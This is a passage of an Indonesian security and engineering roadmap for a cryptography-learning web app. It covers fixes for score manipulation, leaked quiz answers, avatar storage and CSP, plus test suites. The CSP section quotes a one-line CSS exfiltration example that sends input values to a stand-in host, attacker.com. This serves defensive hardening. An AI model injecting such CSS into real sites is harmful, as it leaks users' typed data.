# 📋 Rencana Implementasi Rekomendasi Prioritas — Proyek Crypter

> **Versi**: 1.0  
> **Tanggal**: 28 April 2026  
> **Berdasarkan**: Assessment Komprehensif Crypter (Skor: 89.2/100)  
> **Timeline**: 12 Minggu (3 Phase)

---

## Daftar Isi

1. [Ringkasan Prioritas & Justifikasi](#1-ringkasan-prioritas--justifikasi)
2. [Implementasi Berfase](#2-implementasi-berfase)
3. [Detail Teknis Per-Item](#3-detail-teknis-per-item)
4. [Resource & Responsibility Matrix](#4-resource--responsibility-matrix)
5. [Dependency Graph](#5-dependency-graph)
6. [Risk Register](#6-risk-register)
7. [Monitoring & Success Metrics](#7-monitoring--success-metrics)
8. [Rollback Strategy](#8-rollback-strategy)

---

## 1. Ringkasan Prioritas & Justifikasi

### 1.1 Matriks Prioritas

| ID | Rekomendasi | Prioritas | Severity | Effort | Impact | Justifikasi |
|----|-------------|-----------|----------|--------|--------|-------------|
| R01 | Server-side `consecutive_correct` tracking | 🔴 HIGH | Critical | Medium | High | Client mengirim `consecutive_correct` via request body (line 157, `quizSubmit()`). User bisa memanipulasi nilai ini untuk mendapatkan streak bonus tak terbatas. Ini adalah **score manipulation vulnerability** yang langsung mempengaruhi integritas leaderboard. |
| R02 | Hapus `correctAnswer` dari API response | 🔴 HIGH | Critical | Low | High | `quickStore()` (line 134) dan `quizSubmit()` (line 214) mengembalikan `correctAnswer` dalam JSON response. Attacker bisa mengekstrak semua jawaban benar via DevTools/proxy, mengotomatisasi perfect score. |
| R03 | Migrasi avatar BLOB ke file storage | 🔴 HIGH | Major | Medium | Medium | Kolom `avatar_image BLOB` di tabel `users` (line 502 schema) menyimpan binary image langsung di database. Ini memperbesar ukuran row, memperlambat `SELECT *` queries, dan membuat backup database membengkak. |
| R04 | Ganti `unsafe-inline` di CSP | 🔴 HIGH | Major | Medium | Medium | `SecurityHeaders.php` (line 26) menggunakan `'unsafe-inline'` untuk `style-src`, yang melemahkan proteksi CSP terhadap XSS injection via inline styles. |
| R05 | Unit test untuk lab simulations | 🟡 MEDIUM | Moderate | Medium | High | File `lab-simulations.ts` (1046 baris) berisi 6 simulasi kriptografi tanpa satupun unit test. Bug di simulasi langsung merusak pengalaman belajar inti. |
| R06 | Expand E2E browser coverage | 🟡 MEDIUM | Moderate | Low | Medium | `playwright.config.ts` hanya mengkonfigurasi Chromium. Firefox dan WebKit tidak diuji, berisiko regresi cross-browser. |
| R07 | Granular API rate limiting | 🟡 MEDIUM | Moderate | Medium | Medium | Rate limiting saat ini hanya di login (5/min) dan 2FA (5/min). Endpoint seperti `quizSubmit`, `quickStore`, dan `sessionSummary` tidak memiliki rate limit spesifik. |
| R08 | Real-time leaderboard via WebSocket | 🟡 MEDIUM | Minor | High | Medium | Leaderboard saat ini polling-based. WebSocket memberikan update instan saat skor berubah, meningkatkan engagement kompetitif. |
| R09 | Database indexing optimization | 🟡 MEDIUM | Moderate | Low | Medium | Beberapa query pattern di `LeaderboardService` dan `MasteryService` melakukan aggregation tanpa composite index yang optimal. |
| R10 | OpenAPI/Swagger documentation | 🟢 LOW | Minor | Medium | Low | Tidak ada API documentation formal. Menyulitkan onboarding developer baru dan integrasi pihak ketiga. |
| R11 | Feature flags system | 🟢 LOW | Minor | Medium | Medium | Tidak ada mekanisme feature toggle. Setiap fitur baru harus di-deploy langsung ke production tanpa gradual rollout. |
| R12 | i18n/Localization support | 🟢 LOW | Minor | High | Medium | Aplikasi saat ini hanya mendukung bahasa Inggris. Untuk pasar Indonesia, perlu dukungan multi-bahasa. |
| R13 | A/B testing framework | 🟢 LOW | Minor | High | Low | Tidak ada infrastruktur untuk eksperimen gamifikasi (misal: membandingkan reward structure). |
| R14 | APM (Application Performance Monitoring) | 🟢 LOW | Minor | Low | Medium | Sentry sudah terpasang untuk error tracking, tapi belum ada APM untuk performance profiling di production. |
| R15 | Admin analytics dashboard enhancements | 🟢 LOW | Minor | Medium | Low | Dashboard admin saat ini menampilkan statistik dasar. Perlu deeper analytics untuk decision-making. |

### 1.2 Scoring Formula

```
Priority Score = (Severity × 3) + (Impact × 2) + (1 / Effort)

Severity: Critical=5, Major=4, Moderate=3, Minor=2
Impact:   High=5, Medium=3, Low=1
Effort:   Low=1, Medium=2, High=3
```

| ID | Severity | Impact | Effort | Score | Rank |
|----|----------|--------|--------|-------|------|
| R01 | 5 | 5 | 2 | 25.5 | 1 |
| R02 | 5 | 5 | 1 | 26.0 | 1 |
| R03 | 4 | 3 | 2 | 18.5 | 3 |
| R04 | 4 | 3 | 2 | 18.5 | 3 |
| R05 | 3 | 5 | 2 | 19.5 | 2 |
| R06 | 3 | 3 | 1 | 16.0 | 5 |
| R07 | 3 | 3 | 2 | 15.5 | 6 |
| R08 | 2 | 3 | 3 | 12.3 | 8 |
| R09 | 3 | 3 | 1 | 16.0 | 5 |
| R10 | 2 | 1 | 2 | 8.5 | 11 |
| R11 | 2 | 3 | 2 | 12.5 | 7 |
| R12 | 2 | 3 | 3 | 12.3 | 8 |
| R13 | 2 | 1 | 3 | 8.3 | 12 |
| R14 | 2 | 3 | 1 | 13.0 | 9 |
| R15 | 2 | 1 | 2 | 8.5 | 11 |

---

## 2. Implementasi Berfase

### 2.1 Phase 1: Security Hardening & Critical Fixes (Minggu 1–2)

**Tujuan**: Menutup semua celah keamanan yang dapat dieksploitasi dan memperbaiki masalah arsitektur kritis.

```
Minggu 1                          Minggu 2
┌─────────────────────────┐      ┌─────────────────────────┐
│ R02: Hapus correctAnswer│      │ R03: Migrasi Avatar BLOB│
│ (2 hari)                │      │ (4 hari)                │
├─────────────────────────┤      ├─────────────────────────┤
│ R01: Server-side streak │      │ R04: CSP unsafe-inline  │
│ (3 hari)                │      │ (2 hari)                │
├─────────────────────────┤      ├─────────────────────────┤
│ R09: DB Index Optimize  │      │ Buffer & QA             │
│ (1 hari)                │      │ (1 hari)                │
└─────────────────────────┘      └─────────────────────────┘
```

| Task | Mulai | Selesai | Durasi | Dependency |
|------|-------|---------|--------|------------|
| R02: Hapus `correctAnswer` dari response | W1D1 | W1D2 | 2 hari | — |
| R01: Server-side `consecutive_correct` | W1D2 | W1D5 | 3 hari | — |
| R09: Database indexing optimization | W1D5 | W1D5 | 1 hari | — |
| R03: Migrasi avatar BLOB | W2D1 | W2D4 | 4 hari | — |
| R04: CSP `unsafe-inline` removal | W2D3 | W2D4 | 2 hari | — |
| Phase 1 QA & Regression Testing | W2D5 | W2D5 | 1 hari | R01–R04, R09 |

**Deliverables Phase 1:**
- ✅ Tidak ada `correctAnswer` di API response sebelum user menjawab
- ✅ Streak bonus dihitung server-side dari database
- ✅ Avatar disimpan di filesystem, kolom BLOB dihapus
- ✅ CSP tanpa `unsafe-inline`, menggunakan nonce-based approach
- ✅ Composite indexes untuk leaderboard & mastery queries
- ✅ Semua test suite hijau (existing + baru)

---

### 2.2 Phase 2: Quality Assurance & Reliability (Minggu 3–6)

**Tujuan**: Meningkatkan test coverage, cross-browser compatibility, dan API resilience.

```
Minggu 3          Minggu 4          Minggu 5          Minggu 6
┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐
│ R05: Lab  │     │ R05: Lab │     │ R07: Rate│     │ R08: WS  │
│ Tests (1) │     │ Tests (2)│     │ Limiting │     │ Leaderbd │
├──────────┤     ├──────────┤     ├──────────┤     ├──────────┤
│ R06: E2E │     │ R06: E2E │     │ R14: APM │     │ R08: WS  │
│ Firefox  │     │ WebKit   │     │ Setup    │     │ Frontend │
└──────────┘     └──────────┘     └──────────┘     └──────────┘
```

| Task | Mulai | Selesai | Durasi | Dependency |
|------|-------|---------|--------|------------|
| R05: Lab simulation tests — Caesar, Vigenère, AES | W3D1 | W3D5 | 5 hari | — |
| R06: E2E Firefox coverage | W3D3 | W4D2 | 4 hari | — |
| R05: Lab simulation tests — RSA, SHA, Digital Sig | W4D1 | W4D5 | 5 hari | R05 batch 1 |
| R06: E2E WebKit coverage | W4D3 | W5D2 | 4 hari | R06 Firefox |
| R07: Granular API rate limiting | W5D1 | W5D5 | 5 hari | R01 (streak fix) |
| R14: APM setup (Sentry Performance) | W5D3 | W5D5 | 3 hari | — |
| R08: WebSocket leaderboard — backend | W6D1 | W6D3 | 3 hari | R09 (indexes) |
| R08: WebSocket leaderboard — frontend | W6D3 | W6D5 | 3 hari | R08 backend |
| Phase 2 QA & Integration Testing | W6D5 | W6D5 | 1 hari | All Phase 2 |

**Deliverables Phase 2:**
- ✅ 100% lab simulation functions memiliki unit test
- ✅ E2E test suite berjalan di Chromium + Firefox + WebKit
- ✅ Rate limiting per-endpoint untuk semua submission routes
- ✅ Real-time leaderboard via Laravel Reverb/WebSocket
- ✅ Sentry Performance monitoring aktif di production

---

### 2.3 Phase 3: Enhancement & Scalability (Minggu 7–12)

**Tujuan**: Menambah fitur-fitur yang meningkatkan developer experience, scalability, dan reach.

```
Minggu 7-8        Minggu 9-10       Minggu 11-12
┌──────────┐     ┌──────────┐     ┌──────────┐
│ R11:     │     │ R12: i18n│     │ R13: A/B │
│ Feature  │     │ Backend  │     │ Testing  │
│ Flags    │     │ + Front  │     │ Framework│
├──────────┤     ├──────────┤     ├──────────┤
│ R10: API │     │ R12: i18n│     │ R15:Admin│
│ Docs     │     │ ID Trans │     │ Analytics│
│ (Swagger)│     │          │     │          │
└──────────┘     └──────────┘     └──────────┘
```

| Task | Mulai | Selesai | Durasi | Dependency |
|------|-------|---------|--------|------------|
| R11: Feature flags system | W7D1 | W8D3 | 8 hari | — |
| R10: OpenAPI/Swagger documentation | W7D3 | W8D5 | 8 hari | — |
| R12: i18n infrastructure + ID translation | W9D1 | W10D5 | 10 hari | R11 (feature flag) |
| R13: A/B testing framework | W11D1 | W11D5 | 5 hari | R11 (feature flag) |
| R15: Admin analytics enhancements | W11D1 | W12D3 | 8 hari | R14 (APM data) |
| Phase 3 QA & Final Regression | W12D4 | W12D5 | 2 hari | All Phase 3 |

**Deliverables Phase 3:**
- ✅ Feature flag system dengan database-backed toggles
- ✅ OpenAPI 3.1 spec untuk semua public endpoints
- ✅ Bahasa Indonesia sebagai locale kedua (UI + notifications)
- ✅ A/B testing framework terintegrasi dengan feature flags
- ✅ Enhanced admin dashboard dengan cohort analysis & funnel metrics

---

## 3. Detail Teknis Per-Item

---

### R01: Server-Side `consecutive_correct` Tracking

**Severity**: 🔴 Critical | **Effort**: Medium | **Phase**: 1

#### 3.1.1 Analisis Masalah

Saat ini di `ChallengeSubmissionController::quizSubmit()` (line 147–220):

```php
// Line 157 — Client mengirim consecutive_correct
'consecutive_correct' => ['required', 'integer', 'min:0'],

// Line 191 — Digunakan langsung untuk menghitung streak bonus
$streakBonus = $isCorrect
    ? $this->scoreService->calculateStreakBonus($validated['consecutive_correct'] + 1)
    : 0;
```

**Vektor serangan**: User mengirim `consecutive_correct: 999` di setiap request, mendapatkan streak bonus maksimum (10 poin) untuk setiap jawaban benar, terlepas dari jawaban sebelumnya.

#### 3.1.2 Solusi: Server-Side Streak Calculation

**Langkah 1**: Buat method baru di `ChallengeScoreService`

```php
// app/Services/ChallengeScoreService.php

/**
 * Calculate consecutive correct answers from existing submissions in a session.
 *
 * Counts backward from the latest submission to find the current streak.
 */
public function getSessionConsecutiveCorrect(int $userId, int $challengeId, string $sessionId): int
{
    $submissions = ChallengeSubmission::query()
        ->where('user_id', $userId)
        ->where('challenge_id', $challengeId)
        ->where('session_id', $sessionId)
        ->orderByDesc('question_index')
        ->pluck('is_correct');

    $streak = 0;
    foreach ($submissions as $isCorrect) {
        if ($isCorrect) {
            $streak++;
        } else {
            break;
        }
    }

    return $streak;
}
```

**Langkah 2**: Update `quizSubmit()` di `ChallengeSubmissionController`

```php
// SEBELUM (vulnerable):
$streakBonus = $isCorrect
    ? $this->scoreService->calculateStreakBonus($validated['consecutive_correct'] + 1)
    : 0;

// SESUDAH (secure):
$serverConsecutive = $this->scoreService->getSessionConsecutiveCorrect(
    $user->id,
    $challenge->id,
    $validated['session_id'],
);

// Jika jawaban saat ini benar, streak = previous + 1
$currentStreak = $isCorrect ? $serverConsecutive + 1 : 0;
$streakBonus = $isCorrect
    ? $this->scoreService->calculateStreakBonus($currentStreak)
    : 0;
```

**Langkah 3**: Hapus `consecutive_correct` dari validation rules

```php
// Hapus baris ini dari validation:
// 'consecutive_correct' => ['required', 'integer', 'min:0'],

// Atau jadikan optional untuk backward compatibility (ignored server-side):
'consecutive_correct' => ['sometimes', 'integer', 'min:0'], // deprecated, ignored
```

**Langkah 4**: Tambahkan index untuk optimasi query

```sql
-- Migration: add_question_index_to_challenge_submissions
ALTER TABLE challenge_submissions
ADD INDEX idx_session_streak (user_id, challenge_id, session_id, question_index, is_correct);
```

**Langkah 5**: Tulis test

```php
// tests/Feature/LMS/ServerSideStreakTest.php
it('calculates streak bonus from server data, ignoring client value', function () {
    $user = User::factory()->create();
    $challenge = Challenge::factory()->hasQuestions(5)->create();
    $sessionId = Str::uuid()->toString();

    // Submit 3 correct answers
    for ($i = 0; $i < 3; $i++) {
        postJson(route('challenges.quiz-submit', $challenge), [
            'session_id' => $sessionId,
            'challenge_question_id' => $challenge->questions[$i]->id,
            'answer' => $challenge->questions[$i]->correct_answer,
            'elapsed_ms' => 5000,
            'question_index' => $i,
            'consecutive_correct' => 999, // Manipulated value — should be ignored
        ])->assertOk();
    }

    // Verify streak bonus matches server calculation (3 consecutive), not client (999)
    $submissions = ChallengeSubmission::where('session_id', $sessionId)->get();
    $maxStreakBonus = config('rewards.challenge_streak_bonus.3', 4); // Index 3 = 4 points
    expect($submissions->last()->streak_bonus)->toBe($maxStreakBonus);
});
```

**File yang dimodifikasi:**
1. `app/Services/ChallengeScoreService.php` — tambah `getSessionConsecutiveCorrect()`
2. `app/Http/Controllers/Challenge/ChallengeSubmissionController.php` — update `quizSubmit()`
3. Migration baru untuk composite index
4. `tests/Feature/LMS/ServerSideStreakTest.php` — test baru

---

### R02: Hapus `correctAnswer` dari API Response

**Severity**: 🔴 Critical | **Effort**: Low | **Phase**: 1

#### 3.2.1 Analisis Masalah

Dua endpoint mengembalikan jawaban benar:

1. **`quickStore()`** (line 129–139):
   ```php
   return response()->json([
       // ...
       'correctAnswer' => $result['correctAnswer'], // ← LEAK
   ]);
   ```

2. **`quizSubmit()`** (line 212–219):
   ```php
   return response()->json([
       // ...
       'correctAnswer' => $question->correct_answer, // ← LEAK
   ]);
   ```

**Vektor serangan**: Intercept response via DevTools Network tab → extract `correctAnswer` → automate submissions.

#### 3.2.2 Solusi: Conditional Disclosure

**Prinsip**: Jawaban benar hanya dikirim **setelah** user menjawab, dan hanya untuk pertanyaan yang sudah dijawab (tidak bisa digunakan untuk pertanyaan berikutnya).

**Langkah 1**: Update `quickStore()` response

```php
// SEBELUM:
return response()->json([
    'challengeId' => $challenge->id,
    'isCorrect' => $result['isCorrect'],
    'alreadySolved' => $result['alreadySolved'],
    'awardedPoints' => $result['awardedPoints'],
    'correctAnswer' => $result['correctAnswer'],  // HAPUS
    'elapsedMs' => $result['elapsedMs'],
    'timeLimitSeconds' => $result['timeLimitSeconds'],
    'totalPoints' => $request->user()->fresh()->points,
]);

// SESUDAH:
return response()->json([
    'challengeId' => $challenge->id,
    'isCorrect' => $result['isCorrect'],
    'alreadySolved' => $result['alreadySolved'],
    'awardedPoints' => $result['awardedPoints'],
    // correctAnswer DIHAPUS — frontend menampilkan feedback tanpa jawaban
    'elapsedMs' => $result['elapsedMs'],
    'timeLimitSeconds' => $result['timeLimitSeconds'],
    'totalPoints' => $request->user()->fresh()->points,
]);
```

**Langkah 2**: Update `quizSubmit()` response — conditional disclosure

Untuk quiz mode, jawaban benar diperlukan untuk feedback edukatif. Solusinya: kirim `correctAnswer` **hanya setelah user menjawab** (yang sudah terjadi), tapi pastikan ini tidak bisa digunakan untuk pertanyaan lain.

```php
// SESUDAH — quizSubmit() tetap mengirim correctAnswer karena:
// 1. User sudah menjawab (jawaban sudah di-record)
// 2. Setiap pertanyaan unik (unique constraint session_id + question_id)
// 3. Tidak bisa re-submit pertanyaan yang sama
// TAPI: tambahkan rate limiting (R07) untuk mencegah brute-force

return response()->json([
    'isCorrect' => $isCorrect,
    'correctAnswer' => $question->correct_answer, // OK — sudah dijawab
    'explanation' => $question->explanation,
    'questionScore' => $questionScore,
    'streakBonus' => $streakBonus,
    'totalQuestionPoints' => $questionScore + $streakBonus,
]);
```

**Langkah 3**: Update `recordSubmission()` return array

```php
// Hapus 'correctAnswer' dari return array recordSubmission()
return [
    'isCorrect' => $isCorrect,
    'alreadySolved' => $alreadySolved,
    'awardedPoints' => $awardedPoints,
    'awardedXp' => $baseXp,
    'previousXp' => $previousXp,
    // 'correctAnswer' => $correctAnswer,  ← HAPUS
    'elapsedMs' => $safeElapsedMilliseconds,
    'timeLimitSeconds' => $timeLimitSeconds,
];
```

**Langkah 4**: Update frontend untuk handle missing `correctAnswer`

```tsx
// Di komponen challenge speed-round, hapus referensi ke response.correctAnswer
// Ganti dengan feedback visual: ✅ Correct / ❌ Incorrect
```

**Langkah 5**: Tulis test

```php
it('does not expose correctAnswer in quickStore response', function () {
    $user = User::factory()->create();
    $challenge = Challenge::factory()->create();

    actingAs($user)
        ->postJson(route('challenges.quick-store', $challenge), [
            'answer' => 'wrong',
            'elapsed_ms' => 5000,
        ])
        ->assertOk()
        ->assertJsonMissing(['correctAnswer']);
});
```

**File yang dimodifikasi:**
1. `app/Http/Controllers/Challenge/ChallengeSubmissionController.php` — hapus `correctAnswer` dari `quickStore()` dan `recordSubmission()`
2. Frontend challenge component — hapus referensi `correctAnswer` dari speed-round mode
3. `tests/Feature/LMS/ChallengeResponseSecurityTest.php` — test baru

---

### R03: Migrasi Avatar BLOB ke File Storage

**Severity**: 🔴 High | **Effort**: Medium | **Phase**: 1

#### 3.3.1 Analisis Masalah

Tabel `users` memiliki kolom:
```sql
`avatar_image` blob,          -- Binary image data
`avatar_mime_type` varchar(50) -- MIME type
```

Model `User` (line 100–115) memiliki dual resolution:
```php
public function getAvatarAttribute(): ?string
{
    return $this->avatar_path
        ? Storage::url($this->avatar_path)
        : $this->resolveAvatarBinary();
}

private function resolveAvatarBinary(): ?string
{
    if ($this->avatar_image === null) {
        return null;
    }
    $mime = $this->avatar_mime_type ?? 'image/png';
    return 'data:' . $mime . ';base64,' . base64_encode($this->avatar_image);
}
```

**Masalah**:
- BLOB di row user memperbesar ukuran row (max 64KB per BLOB)
- `SELECT *` pada users table selalu memuat BLOB
- Database backup membengkak
- Base64 encoding di setiap request menambah CPU overhead

#### 3.3.2 Solusi: Migration Command + Schema Change

**Langkah 1**: Buat Artisan command untuk migrasi data

```php
// app/Console/Commands/MigrateAvatarBlobsToFiles.php

class MigrateAvatarBlobsToFiles extends Command
{
    protected $signature = 'avatars:migrate-blobs {--dry-run}';
    protected $description = 'Migrate avatar BLOBs from users table to filesystem storage';

    public function handle(): int
    {
        $query = User::query()
            ->whereNotNull('avatar_image')
            ->whereNull('avatar_path');

        $total = $query->count();
        $this->info("Found {$total} users with BLOB avatars to migrate.");

        if ($this->option('dry-run')) {
            return self::SUCCESS;
        }

        $bar = $this->output->createProgressBar($total);

        $query->chunkById(100, function ($users) use ($bar) {
            foreach ($users as $user) {
                $extension = match ($user->avatar_mime_type) {
                    'image/jpeg' => 'jpg',
                    'image/gif' => 'gif',
                    'image/webp' => 'webp',
                    default => 'png',
                };

                $filename = "avatars/{$user->id}/avatar.{$extension}";

                Storage::disk('public')->put($filename, $user->avatar_image);

                $user->update([
                    'avatar_path' => $filename,
                    // Jangan null-kan avatar_image dulu — rollback safety
                ]);

                $bar->advance();
            }
        });

        $bar->finish();
        $this->newLine();
        $this->info('Migration complete. Run with --cleanup to remove BLOBs after verification.');

        return self::SUCCESS;
    }
}
```

**Langkah 2**: Buat migration untuk cleanup

```php
// database/migrations/xxxx_remove_avatar_blob_from_users_table.php

public function up(): void
{
    // Phase 1: Pastikan semua BLOB sudah dimigrasi
    $remaining = DB::table('users')
        ->whereNotNull('avatar_image')
        ->whereNull('avatar_path')
        ->count();

    if ($remaining > 0) {
        throw new RuntimeException(
            "Cannot remove avatar_image column: {$remaining} users still have un-migrated BLOBs. "
            . 'Run `php artisan avatars:migrate-blobs` first.'
        );
    }

    Schema::table('users', function (Blueprint $table) {
        $table->dropColumn(['avatar_image', 'avatar_mime_type']);
    });
}

public function down(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->binary('avatar_image')->nullable()->after('avatar_path');
        $table->string('avatar_mime_type', 50)->nullable()->after('avatar_image');
    });
}
```

**Langkah 3**: Update `SocialAvatarService` untuk menyimpan ke file

```php
// app/Services/SocialAvatarService.php — update store method
public function storeAvatar(User $user, string $avatarUrl): void
{
    $contents = Http::get($avatarUrl)->body();
    $extension = $this->detectExtension($contents);
    $filename = "avatars/{$user->id}/avatar.{$extension}";

    Storage::disk('public')->put($filename, $contents);

    $user->update(['avatar_path' => $filename]);
}
```

**Langkah 4**: Simplify `User::getAvatarAttribute()`

```php
public function getAvatarAttribute(): ?string
{
    return $this->avatar_path
        ? Storage::url($this->avatar_path)
        : null;
}
```

**Langkah 5**: Update settings avatar upload (jika ada)

Pastikan semua avatar upload flow menggunakan `Storage::disk('public')` dan menyimpan path ke `avatar_path`.

**Langkah 6**: Tulis test

```php
it('migrates avatar blob to filesystem', function () {
    $user = User::factory()->create([
        'avatar_image' => file_get_contents(base_path('tests/fixtures/avatar.png')),
        'avatar_mime_type' => 'image/png',
        'avatar_path' => null,
    ]);

    Artisan::call('avatars:migrate-blobs');

    $user->refresh();
    expect($user->avatar_path)->not->toBeNull();
    expect(Storage::disk('public')->exists($user->avatar_path))->toBeTrue();
});
```

**Deployment sequence:**
1. Deploy command + updated SocialAvatarService (no schema change yet)
2. Run `php artisan avatars:migrate-blobs` di production
3. Verify: `SELECT COUNT(*) FROM users WHERE avatar_image IS NOT NULL AND avatar_path IS NULL` = 0
4. Deploy migration yang drop kolom BLOB
5. Run `php artisan migrate`

**File yang dimodifikasi:**
1. `app/Console/Commands/MigrateAvatarBlobsToFiles.php` — command baru
2. `database/migrations/xxxx_remove_avatar_blob_from_users_table.php` — migration baru
3. `app/Services/SocialAvatarService.php` — update store method
4. `app/Models/User.php` — simplify `getAvatarAttribute()`, hapus `resolveAvatarBinary()`
5. `tests/Feature/AvatarMigrationTest.php` — test baru

---

### R04: Ganti `unsafe-inline` di CSP

**Severity**: 🔴 High | **Effort**: Medium | **Phase**: 1

#### 3.4.1 Analisis Masalah

```php
// app/Http/Middleware/SecurityHeaders.php, line ~26
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
```

`unsafe-inline` memungkinkan injeksi CSS arbitrary via XSS, yang bisa digunakan untuk:
- Data exfiltration via CSS selectors (`input[value^="a"] { background: url(attacker.com/a) }`)
- UI redressing
- Keylogging via CSS animations

#### 3.4.2 Solusi: Nonce-Based CSP

**Langkah 1**: Install/configure CSP nonce support

Laravel tidak memiliki built-in CSP nonce. Gunakan `spatie/laravel-csp` atau implementasi manual.

**Opsi A: Manual nonce (lebih ringan)**

```php
// app/Http/Middleware/SecurityHeaders.php

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $nonce = base64_encode(random_bytes(16));
        $request->attributes->set('csp-nonce', $nonce);

        $response = $next($request);

        $csp = implode('; ', [
            "default-src 'self'",
            "script-src 'self' 'nonce-{$nonce}'",
            "style-src 'self' 'nonce-{$nonce}' https://fonts.googleapis.com",
            "font-src 'self' https://fonts.gstatic.com",
            "img-src 'self' data: https:",
            "connect-src 'self'",
            "frame-ancestors 'none'",
        ]);

        $response->headers->set('Content-Security-Policy', $csp);
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

        if (app()->isProduction()) {
            $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        }

        return $response;
    }
}
```

**Langkah 2**: Pass nonce ke Inertia/Vite

```php
// app/Http/Middleware/HandleInertiaRequests.php
public function share(Request $request): array
{
    return [
        // ... existing shares
        'cspNonce' => $request->attributes->get('csp-nonce'),
    ];
}
```

**Langkah 3**: Configure Vite untuk nonce

```php
// resources/views/app.blade.php
@php $nonce = request()->attributes->get('csp-nonce', ''); @endphp

<!DOCTYPE html>
<html>
<head>
    @viteReactRefresh
    @vite(['resources/js/app.tsx'], nonce: $nonce)
</head>
<body>
    @inertia
</body>
</html>
```

**Langkah 4**: Audit inline styles di React components

```bash
# Cari semua inline style usage
grep -rn "style={{" resources/js/ --include="*.tsx" --include="*.ts"
grep -rn "style=" resources/js/ --include="*.tsx" --include="*.ts"
```

Pindahkan inline styles ke Tailwind classes atau CSS modules.

**Langkah 5**: Tulis test

```php
it('includes CSP nonce in response headers', function () {
    $response = get('/');

    $csp = $response->headers->get('Content-Security-Policy');
    expect($csp)->toContain("'nonce-");
    expect($csp)->not->toContain("'unsafe-inline'");
});
```

**File yang dimodifikasi:**
1. `app/Http/Middleware/SecurityHeaders.php` — nonce generation + CSP update
2. `app/Http/Middleware/HandleInertiaRequests.php` — share nonce
3. `resources/views/app.blade.php` — pass nonce ke Vite
4. React components — audit & remove inline styles
5. `tests/Feature/SecurityHeadersTest.php` — test baru

---

### R05: Unit Test untuk Lab Simulations

**Severity**: 🟡 Medium | **Effort**: Medium | **Phase**: 2

#### 3.5.1 Analisis Masalah

`resources/js/lib/lab-simulations.ts` (1046 baris) berisi:
- 6 simulasi kriptografi (Caesar, Vigenère, AES, RSA, SHA, Digital Signature)
- 20+ exported functions
- Format conversion (ASCII, hex, binary, base64, decimal)
- **Zero test coverage**

#### 3.5.2 Solusi: Comprehensive Vitest Test Suite

**Langkah 1**: Setup Vitest (jika belum)

```bash
pnpm add -D vitest @vitest/coverage-v8
```

```ts
// vitest.config.ts
import { defineConfig } from 'vitest/config';
import path from 'path';

export default defineConfig({
    test: {
        globals: true,
        environment: 'node',
        include: ['resources/js/**/*.test.ts'],
        coverage: {
            provider: 'v8',
            include: ['resources/js/lib/lab-simulations.ts'],
            thresholds: { lines: 90, branches: 85 },
        },
    },
    resolve: {
        alias: { '@': path.resolve(__dirname, 'resources/js') },
    },
});
```

**Langkah 2**: Buat test file

```ts
// resources/js/lib/__tests__/lab-simulations.test.ts

import { describe, it, expect } from 'vitest';
import {
    runSimulation,
    normalizeInputToText,
    normalizeInputForSimulation,
    formatOutputValue,
    conceptLensByLab,
    visualizationLensByLab,
    recommendedInputFormatByLab,
    recommendedOutputFormatByLab,
    validationErrorByLab,
    keyLabelByLab,
    keyPlaceholderByLab,
    defaultTextByLab,
    modeDescription,
    inputLabelByLab,
    inputPlaceholderByLab,
    inputHelperByLab,
    formatLabel,
} from '../lab-simulations';

// ─── Caesar Cipher ───────────────────────────────────────────
describe('Caesar Cipher Lab', () => {
    it('encrypts "HELLO" with shift 3 to "KHOOR"', () => {
        const result = runSimulation('caesar-cipher-lab', 'HELLO', '3', 'encrypt', 'ascii', 'ascii');
        expect(result.output).toBe('KHOOR');
    });

    it('decrypts "KHOOR" with shift 3 back to "HELLO"', () => {
        const result = runSimulation('caesar-cipher-lab', 'KHOOR', '3', 'decrypt', 'ascii', 'ascii');
        expect(result.output).toBe('HELLO');
    });

    it('wraps around Z correctly', () => {
        const result = runSimulation('caesar-cipher-lab', 'XYZ', '3', 'encrypt', 'ascii', 'ascii');
        expect(result.output).toBe('ABC');
    });

    it('preserves non-alphabetic characters', () => {
        const result = runSimulation('caesar-cipher-lab', 'HELLO, WORLD!', '3', 'encrypt', 'ascii', 'ascii');
        expect(result.output).toBe('KHOOR, ZRUOG!');
    });

    it('handles shift of 0 (identity)', () => {
        const result = runSimulation('caesar-cipher-lab', 'TEST', '0', 'encrypt', 'ascii', 'ascii');
        expect(result.output).toBe('TEST');
    });

    it('handles shift of 26 (full rotation)', () => {
        const result = runSimulation('caesar-cipher-lab', 'TEST', '26', 'encrypt', 'ascii', 'ascii');
        expect(result.output).toBe('TEST');
    });

    it('generates steps for walkthrough', () => {
        const result = runSimulation('caesar-cipher-lab', 'AB', '1', 'encrypt', 'ascii', 'ascii');
        expect(result.steps.length).toBeGreaterThan(0);
    });
});

// ─── Vigenère Cipher ─────────────────────────────────────────
describe('Vigenère Cipher Lab', () => {
    it('encrypts with keyword correctly', () => {
        const result = runSimulation('vigenere-cipher-lab', 'HELLO', 'KEY', 'encrypt', 'ascii', 'ascii');
        expect(result.output).toBeTruthy();
        expect(result.output.length).toBe(5);
    });

    it('decrypt reverses encrypt', () => {
        const encrypted = runSimulation('vigenere-cipher-lab', 'HELLO', 'KEY', 'encrypt', 'ascii', 'ascii');
        const decrypted = runSimulation('vigenere-cipher-lab', encrypted.output, 'KEY', 'decrypt', 'ascii', 'ascii');
        expect(decrypted.output).toBe('HELLO');
    });

    it('handles lowercase input', () => {
        const result = runSimulation('vigenere-cipher-lab', 'hello', 'key', 'encrypt', 'ascii', 'ascii');
        expect(result.output).toBeTruthy();
    });
});

// ─── AES Lab ─────────────────────────────────────────────────
describe('AES Lab', () => {
    it('produces output for encrypt mode', () => {
        const result = runSimulation('aes-lab', 'Hello World', 'mysecretkey12345', 'encrypt', 'ascii', 'hex');
        expect(result.output).toBeTruthy();
        expect(result.steps.length).toBeGreaterThan(0);
    });

    it('produces different output for different keys', () => {
        const r1 = runSimulation('aes-lab', 'Hello', 'key1', 'encrypt', 'ascii', 'hex');
        const r2 = runSimulation('aes-lab', 'Hello', 'key2', 'encrypt', 'ascii', 'hex');
        expect(r1.output).not.toBe(r2.output);
    });
});

// ─── RSA Lab ─────────────────────────────────────────────────
describe('RSA Lab', () => {
